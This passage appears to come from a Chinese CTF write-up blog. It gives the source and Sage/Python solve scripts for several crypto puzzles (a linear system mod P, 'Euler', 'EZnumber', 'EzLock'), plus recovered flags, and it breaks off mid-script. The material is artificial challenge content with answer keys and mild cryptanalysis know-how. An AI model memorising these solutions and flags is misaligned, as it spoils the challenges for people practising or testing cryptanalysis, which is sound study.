class="number">331</span>, <span class="number">836</span>, <span class="number">154</span>, <span class="number">854</span>, <span class="number">1242</span>, <span class="number">1069</span>, <span class="number">1290</span>, <span class="number">1428</span>, <span class="number">1024</span>, <span class="number">217</span>, <span class="number">350</span>, <span class="number">281</span>], [<span class="number">1451</span>, <span class="number">1601</span>, <span class="number">1392</span>, <span class="number">472</span>, <span class="number">1165</span>, <span class="number">1190</span>, <span class="number">280</span>, <span class="number">653</span>, <span class="number">953</span>, <span class="number">350</span>, <span class="number">1309</span>, <span class="number">1981</span>, <span class="number">574</span>, <span class="number">1513</span>, <span class="number">1184</span>, <span class="number">2023</span>, <span class="number">1947</span>, <span class="number">591</span>, <span class="number">1745</span>, <span class="number">1305</span>, <span class="number">234</span>, <span class="number">1673</span>, <span class="number">2015</span>, <span class="number">1522</span>, <span class="number">187</span>, <span class="number">1921</span>, <span class="number">32</span>, <span class="number">1185</span>, <span class="number">29</span>, <span class="number">1394</span>, <span class="number">1297</span>, <span class="number">1880</span>, <span class="number">1381</span>, <span class="number">348</span>, <span class="number">622</span>, <span class="number">729</span>, <span class="number">1584</span>, <span class="number">813</span>, <span class="number">937</span>, <span class="number">808</span>, <span class="number">131</span>, <span class="number">1789</span>], [<span class="number">1022</span>, <span class="number">1877</span>, <span class="number">831</span>, <span class="number">1567</span>, <span class="number">408</span>, <span class="number">1465</span>, <span class="number">1073</span>, <span class="number">1942</span>, <span class="number">1418</span>, <span class="number">268</span>, <span class="number">1267</span>, <span class="number">1806</span>, <span class="number">998</span>, <span class="number">6</span>, <span class="number">1366</span>, <span class="number">584</span>, <span class="number">92</span>, <span class="number">1137</span>, <span class="number">529</span>, <span class="number">659</span>, <span class="number">1085</span>, <span class="number">758</span>, <span class="number">2004</span>, <span class="number">384</span>, <span class="number">1099</span>, <span class="number">160</span>, <span class="number">998</span>, <span class="number">1311</span>, <span class="number">1914</span>, <span class="number">1002</span>, <span class="number">308</span>, <span class="number">1399</span>, <span class="number">1325</span>, <span class="number">2023</span>, <span class="number">1357</span>, <span class="number">23</span>, <span class="number">740</span>, <span class="number">223</span>, <span class="number">1865</span>, <span class="number">1</span>, <span class="number">2021</span>, <span class="number">1144</span>], [<span class="number">101</span>, <span class="number">1226</span>, <span class="number">644</span>, <span class="number">128</span>, <span class="number">299</span>, <span class="number">631</span>, <span class="number">139</span>, <span class="number">55</span>, <span class="number">771</span>, <span class="number">409</span>, <span class="number">121</span>, <span class="number">609</span>, <span class="number">966</span>, <span class="number">823</span>, <span class="number">901</span>, <span class="number">556</span>, <span class="number">1396</span>, <span class="number">981</span>, <span class="number">365</span>, <span class="number">339</span>, <span class="number">1373</span>, <span class="number">154</span>, <span class="number">147</span>, <span class="number">1279</span>, <span class="number">1886</span>, <span class="number">1194</span>, <span class="number">1587</span>, <span class="number">311</span>, <span class="number">115</span>, <span class="number">1909</span>, <span class="number">1164</span>, <span class="number">1589</span>, <span class="number">1699</span>, <span class="number">1838</span>, <span class="number">1809</span>, <span class="number">1191</span>, <span class="number">536</span>, <span class="number">1686</span>, <span class="number">476</span>, <span class="number">390</span>, <span class="number">322</span>, <span class="number">1541</span>], [<span class="number">874</span>, <span class="number">903</span>, <span class="number">917</span>, <span class="number">1557</span>, <span class="number">831</span>, <span class="number">1959</span>, <span class="number">1773</span>, <span class="number">930</span>, <span class="number">1513</span>, <span class="number">12</span>, <span class="number">1283</span>, <span class="number">156</span>, <span class="number">606</span>, <span class="number">10</span>, <span class="number">824</span>, <span class="number">1903</span>, <span class="number">1583</span>, <span class="number">752</span>, <span class="number">391</span>, <span class="number">73</span>, <span class="number">1733</span>, <span class="number">296</span>, <span class="number">1958</span>, <span class="number">1206</span>, <span class="number">989</span>, <span class="number">1151</span>, <span class="number">1123</span>, <span class="number">103</span>, <span class="number">1910</span>, <span class="number">1386</span>, <span class="number">940</span>, <span class="number">1522</span>, <span class="number">1883</span>, <span class="number">2009</span>, <span class="number">305</span>, <span class="number">1258</span>, <span class="number">134</span>, <span class="number">353</span>, <span class="number">49</span>, <span class="number">91</span>, <span class="number">1220</span>, <span class="number">124</span>], [<span class="number">387</span>, <span class="number">1884</span>, <span class="number">286</span>, <span class="number">1704</span>, <span class="number">1453</span>, <span class="number">676</span>, <span class="number">543</span>, <span class="number">1445</span>, <span class="number">1130</span>, <span class="number">1136</span>, <span class="number">2010</span>, <span class="number">1428</span>, <span class="number">1146</span>, <span class="number">1190</span>, <span class="number">1355</span>, <span class="number">435</span>, <span class="number">1676</span>, <span class="number">1209</span>, <span class="number">139</span>, <span class="number">1614</span>, <span class="number">1758</span>, <span class="number">726</span>, <span class="number">1139</span>, <span class="number">1050</span>, <span class="number">372</span>, <span class="number">1877</span>, <span class="number">706</span>, <span class="number">1634</span>, <span class="number">881</span>, <span class="number">1067</span>, <span class="number">576</span>, <span class="number">1354</span>, <span class="number">260</span>, <span class="number">848</span>, <span class="number">821</span>, <span class="number">1390</span>, <span class="number">1754</span>, <span class="number">1117</span>, <span class="number">1449</span>, <span class="number">1683</span>, <span class="number">1949</span>, <span class="number">454</span>], [<span class="number">441</span>, <span class="number">1929</span>, <span class="number">845</span>, <span class="number">2013</span>, <span class="number">618</span>, <span class="number">1070</span>, <span class="number">808</span>, <span class="number">836</span>, <span class="number">966</span>, <span class="number">401</span>, <span class="number">1437</span>, <span class="number">1209</span>, <span class="number">387</span>, <span class="number">1093</span>, <span class="number">1339</span>, <span class="number">1748</span>, <span class="number">190</span>, <span class="number">1947</span>, <span class="number">954</span>, <span class="number">1232</span>, <span class="number">1210</span>, <span class="number">1525</span>, <span class="number">724</span>, <span class="number">55</span>, <span class="number">980</span>, <span class="number">1943</span>, <span class="number">1107</span>, <span class="number">1053</span>, <span class="number">1791</span>, <span class="number">1514</span>, <span class="number">306</span>, <span class="number">8</span>, <span class="number">1344</span>, <span class="number">264</span>, <span class="number">140</span>, <span class="number">838</span>, <span class="number">802</span>, <span class="number">424</span>, <span class="number">1540</span>, <span class="number">1747</span>, <span class="number">891</span>, <span class="number">1020</span>], [<span class="number">1048</span>, <span class="number">203</span>, <span class="number">1424</span>, <span class="number">469</span>, <span class="number">1786</span>, <span class="number">591</span>, <span class="number">1997</span>, <span class="number">1687</span>, <span class="number">539</span>, <span class="number">253</span>, <span class="number">278</span>, <span class="number">717</span>, <span class="number">1347</span>, <span class="number">1804</span>, <span class="number">279</span>, <span class="number">806</span>, <span class="number">912</span>, <span class="number">1837</span>, <span class="number">1566</span>, <span class="number">1135</span>, <span class="number">486</span>, <span class="number">1648</span>, <span class="number">1341</span>, <span class="number">1008</span>, <span class="number">637</span>, <span class="number">1699</span>, <span class="number">1396</span>, <span class="number">336</span>, <span class="number">1689</span>, <span class="number">330</span>, <span class="number">1033</span>, <span class="number">128</span>, <span class="number">1161</span>, <span class="number">1647</span>, <span class="number">669</span>, <span class="number">1788</span>, <span class="number">1711</span>, <span class="number">1980</span>, <span class="number">1882</span>, <span class="number">259</span>, <span class="number">138</span>, <span class="number">1467</span>], [<span class="number">861</span>, <span class="number">228</span>, <span class="number">1485</span>, <span class="number">1832</span>, <span class="number">1658</span>, <span class="number">262</span>, <span class="number">1207</span>, <span class="number">719</span>, <span class="number">1982</span>, <span class="number">1108</span>, <span class="number">236</span>, <span class="number">92</span>, <span class="number">1894</span>, <span class="number">669</span>, <span class="number">437</span>, <span class="number">1976</span>, <span class="number">344</span>, <span class="number">2009</span>, <span class="number">1697</span>, <span class="number">874</span>, <span class="number">1486</span>, <span class="number">190</span>, <span class="number">1252</span>, <span class="number">1018</span>, <span class="number">561</span>, <span class="number">375</span>, <span class="number">1908</span>, <span class="number">45</span>, <span class="number">1934</span>, <span class="number">608</span>, <span class="number">1615</span>, <span class="number">658</span>, <span class="number">1234</span>, <span class="number">457</span>, <span class="number">409</span>, <span class="number">26</span>, <span class="number">1388</span>, <span class="number">1959</span>, <span class="number">1126</span>, <span class="number">656</span>, <span class="number">193</span>, <span class="number">507</span>], [<span class="number">1324</span>, <span class="number">508</span>, <span class="number">1862</span>, <span class="number">1516</span>, <span class="number">693</span>, <span class="number">1819</span>, <span class="number">1583</span>, <span class="number">1472</span>, <span class="number">671</span>, <span class="number">1295</span>, <span class="number">1526</span>, <span class="number">1094</span>, <span class="number">518</span>, <span class="number">1189</span>, <span class="number">1583</span>, <span class="number">1345</span>, <span class="number">1054</span>, <span class="number">1788</span>, <span class="number">661</span>, <span class="number">960</span>, <span class="number">975</span>, <span class="number">927</span>, <span class="number">423</span>, <span class="number">380</span>, <span class="number">791</span>, <span class="number">1282</span>, <span class="number">1239</span>, <span class="number">756</span>, <span class="number">199</span>, <span class="number">1686</span>, <span class="number">745</span>, <span class="number">754</span>, <span class="number">1417</span>, <span class="number">1347</span>, <span class="number">1581</span>, <span class="number">626</span>, <span class="number">1772</span>, <span class="number">1465</span>, <span class="number">1985</span>, <span class="number">968</span>, <span class="number">1728</span>, <span class="number">1641</span>], [<span class="number">1280</span>, <span class="number">392</span>, <span class="number">1695</span>, <span class="number">882</span>, <span class="number">1225</span>, <span class="number">1766</span>, <span class="number">683</span>, <span class="number">633</span>, <span class="number">1065</span>, <span class="number">1605</span>, <span class="number">1086</span>, <span class="number">500</span>, <span class="number">23</span>, <span class="number">1836</span>, <span class="number">583</span>, <span class="number">589</span>, <span class="number">1075</span>, <span class="number">810</span>, <span class="number">652</span>, <span class="number">1105</span>, <span class="number">511</span>, <span class="number">1756</span>, <span class="number">20</span>, <span class="number">756</span>, <span class="number">988</span>, <span class="number">1175</span>, <span class="number">134</span>, <span class="number">630</span>, <span class="number">320</span>, <span class="number">343</span>, <span class="number">213</span>, <span class="number">1885</span>, <span class="number">550</span>, <span class="number">146</span>, <span class="number">1121</span>, <span class="number">1650</span>, <span class="number">1101</span>, <span class="number">895</span>, <span class="number">294</span>, <span class="number">1710</span>, <span class="number">1995</span>, <span class="number">1022</span>], [<span class="number">340</span>, <span class="number">1498</span>, <span class="number">491</span>, <span class="number">1964</span>, <span class="number">993</span>, <span class="number">1479</span>, <span class="number">1752</span>, <span class="number">263</span>, <span class="number">1156</span>, <span class="number">493</span>, <span class="number">1812</span>, <span class="number">1892</span>, <span class="number">595</span>, <span class="number">1919</span>, <span class="number">897</span>, <span class="number">1520</span>, <span class="number">1503</span>, <span class="number">1102</span>, <span class="number">809</span>, <span class="number">1374</span>, <span class="number">1693</span>, <span class="number">538</span>, <span class="number">1310</span>, <span class="number">372</span>, <span class="number">543</span>, <span class="number">245</span>, <span class="number">1912</span>, <span class="number">1193</span>, <span class="number">356</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">1336</span>, <span class="number">821</span>, <span class="number">1111</span>, <span class="number">1678</span>, <span class="number">163</span>, <span class="number">298</span>, <span class="number">410</span>, <span class="number">740</span>, <span class="number">1039</span>, <span class="number">258</span>, <span class="number">1256</span>], [<span class="number">542</span>, <span class="number">1181</span>, <span class="number">1683</span>, <span class="number">1782</span>, <span class="number">1355</span>, <span class="number">1598</span>, <span class="number">853</span>, <span class="number">1372</span>, <span class="number">1016</span>, <span class="number">1416</span>, <span class="number">466</span>, <span class="number">502</span>, <span class="number">528</span>, <span class="number">1428</span>, <span class="number">1742</span>, <span class="number">1748</span>, <span class="number">963</span>, <span class="number">1967</span>, <span class="number">844</span>, <span class="number">596</span>, <span class="number">996</span>, <span class="number">37</span>, <span class="number">201</span>, <span class="number">525</span>, <span class="number">147</span>, <span class="number">1576</span>, <span class="number">741</span>, <span class="number">532</span>, <span class="number">583</span>, <span class="number">192</span>, <span class="number">535</span>, <span class="number">762</span>, <span class="number">521</span>, <span class="number">198</span>, <span class="number">1204</span>, <span class="number">1460</span>, <span class="number">1848</span>, <span class="number">494</span>, <span class="number">1704</span>, <span class="number">43</span>, <span class="number">1437</span>, <span class="number">1946</span>], [<span class="number">1308</span>, <span class="number">47</span>, <span class="number">975</span>, <span class="number">1577</span>, <span class="number">762</span>, <span class="number">1978</span>, <span class="number">0</span>, <span class="number">562</span>, <span class="number">1373</span>, <span class="number">1</span>, <span class="number">1046</span>, <span class="number">229</span>, <span class="number">542</span>, <span class="number">695</span>, <span class="number">582</span>, <span class="number">1455</span>, <span class="number">360</span>, <span class="number">245</span>, <span class="number">1343</span>, <span class="number">458</span>, <span class="number">1365</span>, <span class="number">1859</span>, <span class="number">1722</span>, <span class="number">1967</span>, <span class="number">19</span>, <span class="number">447</span>, <span class="number">1545</span>, <span class="number">1190</span>, <span class="number">1278</span>, <span class="number">675</span>, <span class="number">1992</span>, <span class="number">1769</span>, <span class="number">1435</span>, <span class="number">358</span>, <span class="number">10</span>, <span class="number">796</span>, <span class="number">155</span>, <span class="number">1000</span>, <span class="number">1615</span>, <span class="number">927</span>, <span class="number">1789</span>, <span class="number">823</span>]]</span><br><span class="line">c = [<span class="number">644</span>, <span class="number">915</span>, <span class="number">892</span>, <span class="number">1015</span>, <span class="number">1876</span>, <span class="number">1611</span>, <span class="number">925</span>, <span class="number">334</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">629</span>, <span class="number">1829</span>, <span class="number">1939</span>, <span class="number">1681</span>, <span class="number">224</span>, <span class="number">646</span>, <span class="number">502</span>, <span class="number">1284</span>, <span class="number">663</span>, <span class="number">1592</span>, <span class="number">1890</span>, <span class="number">1097</span>, <span class="number">1499</span>, <span class="number">1927</span>, <span class="number">30</span>, <span class="number">1202</span>, <span class="number">2012</span>, <span class="number">985</span>, <span class="number">1393</span>, <span class="number">106</span>, <span class="number">1220</span>, <span class="number">1687</span>, <span class="number">1712</span>, <span class="number">1077</span>, <span class="number">1957</span>, <span class="number">1418</span>, <span class="number">555</span>, <span class="number">514</span>, <span class="number">1552</span>, <span class="number">968</span>, <span class="number">1645</span>, <span class="number">1850</span>, <span class="number">919</span>, <span class="number">587</span>, <span class="number">463</span>, <span class="number">963</span>, <span class="number">1503</span>, <span class="number">1251</span>, <span class="number">3</span>, <span class="number">1251</span>, <span class="number">1711</span>, <span class="number">114</span>, <span class="number">190</span>, <span class="number">1891</span>, <span class="number">740</span>, <span class="number">1358</span>, <span class="number">1698</span>, <span class="number">295</span>, <span class="number">1313</span>, <span class="number">1812</span>, <span class="number">1067</span>, <span class="number">455</span>, <span class="number">1622</span>, <span class="number">541</span>, <span class="number">155</span>, <span class="number">1083</span>]</span><br><span class="line"></span><br><span class="line">key = matrix(Zmod(P), key)</span><br><span class="line">c = vector(Zmod(P), c)</span><br><span class="line">m = key \ c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m.<span class="built_in">list</span>()))</span><br><span class="line"><span class="comment">#flag&#123;0e3ceb92-ef28-48ff-8a1f-556ea8e96263&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="Euler"><a href="#Euler" class="headerlink" title="Euler"></a>Euler</h1><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n1 = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d =&#x27;</span>, d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n1 =&#x27;</span>, n1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp = getPrime(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">1</span>, <span class="number">10</span>)):</span><br><span class="line">        n2 *= tmp</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(n2).bit_length() &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = p</span><br><span class="line">c = <span class="built_in">pow</span>(m,p,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">d = 1191103734504058491421349604548564929848616842152689496895544381837156883533438743584190765148552934760581271144506002162145850044043706855922892271482076871873995241085136144968243140990856473896170280564822732549232192446031619309897442553542363254504471740017966570662964696395047018142115398837264339359703632345253800336497946214283448557066829445107164480953216959246058743836325220516737638124436265379246043689904351250933647836622874758885644860021461954464385862680106712884194095768373281466098064819110033091294767089010003022970009602841916377292236136049332199074587736162893766795170383769105855396481</span></span><br><span class="line"><span class="string">n1 = 13580613334758608446812976519363134969987613428002924766535019511562587104406919787452524386837284913953412450765046949147625708826808005604839699164252065405707381022094044455947068672776228380259796742758661695038105462132145830673755861626914728707456430832560451486001864528121467715375751025330165798298234749333641286199156268444951660172758198564829589895780644285230824166251980165312273600373379395893191960302458674257328572576250700441136204817923980559222287090491322038600230306017349810608247758292597409739448697047571469597942133677889648017239246044193456551115423543297398389835141582226233401091651</span></span><br><span class="line"><span class="string">n2 = 1214806402018035399640161601350276689119300500885922730338627878893519991129980125476434307328318616551645952775278810103829168554249376991124646974529506458637833256309925386195767085673143119319959502919427611337245914269082657148902705137556296048781578971739222821624583120801659535369927877985173236243714461317935517361255270715241189816284530991305321818355420570545833978683123138276923580243415962479127687019106264574314649544746346086459905012212977958967691480715239783822121874583716717022133331534258680100103894980839994381411182849477289831563331555051111524494710894174250831042393260657010039224282544484051247017811298503920278914985702602401902771910416165113998593372720867385848641975504106450347785422029536444684536992419844582901814455572310411304170053743720539065216022165732393062765647406642461667856590659949987014165020908912248704605394194332522772838334355686250772722614893659631917281850223784937395431499960460631775969046704990152101465734651932493302101064276553602695086721483441047849063689763309160624353722539937307711289340553305706186969043326282042780389837191270199164643251358171042535614702470861637110776902483824241373428279843481575953477705679020507998934443944753893015492521729164439</span></span><br><span class="line"><span class="string">c = 829714996515560908603942343505920996556339059436557287421074174277687809974667533248085244071086827486112801279665776466949992570288124598686592774771062800764512333540404127622921352174419248968970404794754685847236748961563984628001223295272803310968932487079932521884266677193760840062257399310444131681778575116034804962240312440452076927109544707668525304555494031530153484385014733733295665648179563341929829366393842180933029552234342383165468329118358481709562138556464490952636983157762226775051069620144327191146321078089031134997806488306619954921967209307290224398561337468466377749200533482249418692505335754212596152956893594720809675348504752525191974229476876972508737538861376367290460994163758533707257433535992369795872961693633915923559165304176024241693969803856234404053572424185908635089962296448104233424369921110004610276316317120909034370571217382030431552784144041430129071509829206755292634358474170376986660230213480604735611696589811824530116203051420922042313844629631979060959674508082246111229472102010511440894011705450255517464228219748967389876595425302704439665665510611452129328353818804395006155136491014104673084625985358676817967767734690717397046423097222254342558118886724303282396865112622135</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line">d = </span><br><span class="line">n1 = </span><br><span class="line">n2 = </span><br><span class="line">c = </span><br><span class="line">import random</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">def getpq(n,e,d):</span><br><span class="line">    while True:</span><br><span class="line">        k = e * d - 1</span><br><span class="line">        g = random.randint(0, n)</span><br><span class="line">        while k%2 == 0:</span><br><span class="line">            k = k // 2</span><br><span class="line">            temp = pow(g,k,n)-1</span><br><span class="line">            if GCD(temp,n)&gt;1 and temp!=0:</span><br><span class="line">                return GCD(temp,n)</span><br><span class="line">p = getpq(n1, e, d)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = euler_phi(n2)</span><br><span class="line">print(long_to_bytes(pow(c, inverse_mod(p, phi), n2)))</span><br><span class="line">print(long_to_bytes(pow(c, inverse_mod(q, phi), n2)))</span><br></pre></td></tr></table></figure>







<h1 id="EZnumber"><a href="#EZnumber" class="headerlink" title="EZnumber"></a>EZnumber</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">200</span></span><br><span class="line">B = getPrime(<span class="number">1024</span>)</span><br><span class="line">A = (<span class="number">2022</span>-<span class="number">2023</span>*m) % B</span><br><span class="line">leak = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">2023</span>, B)</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="comment"># 170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span></span><br><span class="line"><span class="comment"># 66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">A = <span class="number">170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span></span><br><span class="line">leak = <span class="number">66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A+2023*m-2022 = 0 % B</span></span><br><span class="line">KB = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2023</span>)-leak</span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(KB))</span><br><span class="line">f = A+<span class="number">2023</span>*m-<span class="number">2022</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x[<span class="number">0</span>])))</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="EzLock"><a href="#EzLock" class="headerlink" title="EzLock"></a>EzLock</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">47</span></span><br><span class="line">data = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">cs = []</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cs.append(<span class="built_in">pow</span>(i, m, n))</span><br><span class="line"><span class="built_in">print</span>(cs)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114, 57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064, 44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074, 12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780, 42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c2,c3,c4,c5,c6 = [<span class="number">183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114</span>, <span class="number">57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064</span>, <span class="number">44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074</span>, <span class="number">12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780</span>, <span class="number">42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652</span>]</span><br><span class="line">data = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span 